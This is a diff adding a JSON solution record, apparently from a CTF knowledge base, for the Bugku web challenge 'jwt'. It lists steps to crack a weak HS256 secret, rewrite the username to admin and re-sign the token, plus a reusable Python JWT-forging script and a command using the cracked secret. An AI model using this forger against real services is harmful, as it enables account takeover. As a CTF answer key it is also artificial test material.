@@ -1,0 +1,48 @@
+{
+  "title": "jwt",
+  "source_id": "[Bugku] 第34题",
+  "capability_id": "",
+  "category": "web",
+  "attachment_type": "无",
+  "detection": {
+    "keywords": [
+      "bugku",
+      "web",
+      "jwt",
+      "CTF",
+      "比赛真题",
+      "网页",
+      "token",
+      "弱密钥",
+      "伪造"
+    ],
+    "attachment_features": "无附件；动态 Web 场景题",
+    "condition": "题面或列表出现 jwt，且为 Bugku 比赛真题 WEB 动态场景题时适用。"
+  },
+  "method": {
+    "principle": "对弱密钥签名的 JWT 进行密钥爆破和身份字段重签名伪造。",
+    "steps": [
+      "注册普通用户并获取 JWT cookie",
+      "用 c-jwt-cracker 或字典爆破 HS256 secret",
+      "将 payload 中用户名/身份字段改为 admin",
+      "用密钥重签名后替换 cookie，访问个人中心读取 flag"
+    ],
+    "tools": [
+      "c-jwt-cracker",
+      "jwt.io",
+      "python3 pyjwt"
+    ],
+    "produces_artifact": false
+  },
+  "solver": {
+    "reusable": true,
+    "module_name": "jwt_weak_secret_forge",
+    "code": "import sys, json, hmac, hashlib, base64\n\ndef b64u_dec(s):\n    s += '=' * (-len(s) % 4)\n    return base64.urlsafe_b64decode(s.encode())\n\ndef b64u_enc(b):\n    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()\n\ndef sign(h, p, secret):\n    msg = (h + '.' + p).encode()\n    return b64u_enc(hmac.new(secret.encode(), msg, hashlib.sha256).digest())\n\nif len(sys.argv) < 4:\n    print(\"usage: python jwt_weak_secret_forge.py <jwt> <secret> '<json_patch>'\")\n    sys.exit(1)\n\ntok, secret, patch = sys.argv[1], sys.argv[2], json.loads(sys.argv[3])\nh, p, s = tok.split('.')\npayload = json.loads(b64u_dec(p))\npayload.update(patch)\nnew_p = b64u_enc(json.dumps(payload, separators=(',', ':')).encode())\nprint(h + '.' + new_p + '.' + sign(h, new_p, secret))\n",
+    "input": "动态场景 JWT、secret 和需要覆盖的 JSON 字段。",
+    "output": "重签名后的 JWT。"
+  },
+  "verification": {
+    "flag": "",
+    "how": "启动 Bugku 场景后运行：python3 jwt_weak_secret_forge.py '<jwt>' NuAa '{\"username\":\"admin\"}'；替换 cookie 后访问个人中心。"
+  }
+}
